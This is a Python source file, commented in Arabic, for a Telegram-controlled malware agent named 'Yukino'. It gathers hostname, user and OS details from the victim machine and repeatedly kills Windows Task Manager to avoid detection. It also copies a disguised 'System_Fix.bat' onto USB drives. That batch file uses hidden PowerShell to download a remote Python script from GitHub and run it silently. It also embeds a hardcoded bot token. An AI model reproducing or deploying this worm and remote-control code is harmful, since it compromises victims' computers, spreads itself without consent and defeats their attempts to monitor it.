import telebot
import os
import platform
import socket
import threading
import time
import subprocess

# التوكن الخاص بك (يوكينو - غالب)
TOKEN = "8060120509:AAHUzbeWow9DAGR1zCAr4YjlIXSiemYWd9g"
bot = telebot.TeleBot(TOKEN)

# --- معلومات الجهاز الضحية ---
def get_system_info():
    try:
        info = {
            "اسم الجهاز": socket.gethostname(),
            "النظام": platform.system(),
            "الإصدار": platform.version(),
            "المعالج": platform.processor(),
            "المستخدم": os.getlogin()
        }
        return info
    except:
        return {"خطأ": "تعذر جلب معلومات النظام"}

# --- بروتوكول الدفاع الذاتي (Anti-Task Manager) ---
def self_defense():
   while True:
        try:
            # التحقق مما إذا كان النظام ويندوز لتشغيل أمر tasklist
            if platform.system() == "Windows":
                output = subprocess.check_output('tasklist', shell=True).decode()
                if "taskmgr.exe" in output.lower():
                    os.system("taskkill /f /im taskmgr.exe")
                    bot.send_message(8060120509, "⚠️ سيدي غالب، تم إحباط محاولة مراقبة في ويندوز!")
            else:
                # إذا كنا في لينكس/WSL، نستخدم أمر ps
                output = subprocess.check_output('ps -aux', shell=True).decode()
                # هنا يمكننا إضافة برامج لينكس المحظورة إذا أردت
        except:
            pass
        time.sleep(5)

# --- أمر البداية ---
@bot.message_handler(commands=['start'])
def welcome(message):
    sys_info = get_system_info()
    response = (
        f"✅ سيدي غالب، يوكينو استيقظت في نظام جديد!\n\n"
        f"💻 الجهاز: {sys_info.get('اسم الجهاز')}\n"
        f"👤 المستخدم: {sys_info.get('المستخدم')}\n"
        f"🖥️ النظام: {sys_info.get('النظام')}\n\n"
        "🛡️ درع الحماية الذاتية: نَشِط\n"
        "📡 بروتوكول الانتشار: نَشِط\n\n"
        "أنا بانتظار أوامرك."
    )
    bot.reply_to(message, response)

# --- بروتوكول الانتشار (USB Virus) ---
def usb_spreader():
    while True:
        for letter in "DEFG":
            path = f"{letter}:\\"
            if os.path.exists(path):
                try:
                    # زرع ملف التشغيل التلقائي في الفلاش الجديد
                    file_path = os.path.join(path, "System_Fix.bat")
                    if not os.path.exists(file_path):
                        with open(file_path, "w") as f:
                            # الكود الذي يسحب النسخة من GitHub ويشغلها مخفية
                            f.write("@echo off\n")
                            f.write("powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Guleb1122/Yukino-Project/main/app.py' -OutFile '$env:LOCALAPPDATA\\yukino_agent.py'; start-process pythonw.exe -ArgumentList '$env:LOCALAPPDATA\\yukino_agent.py'\"\n")
                            f.write("echo System Updated.\n")
                            f.write("exit")
                except:
                    pass
        time.sleep(30)

# --- تشغيل العمليات في الخلفية ---
# 1. تشغيل الانتشار
threading.Thread(target=usb_spreader, daemon=True).start()
# 2. تشغيل الدفاع الذاتي
threading.Thread(target=self_defense, daemon=True).start()

# تشغيل البوت
print("Yukino is running with Defense Protocols...")
bot.infinity_polling()
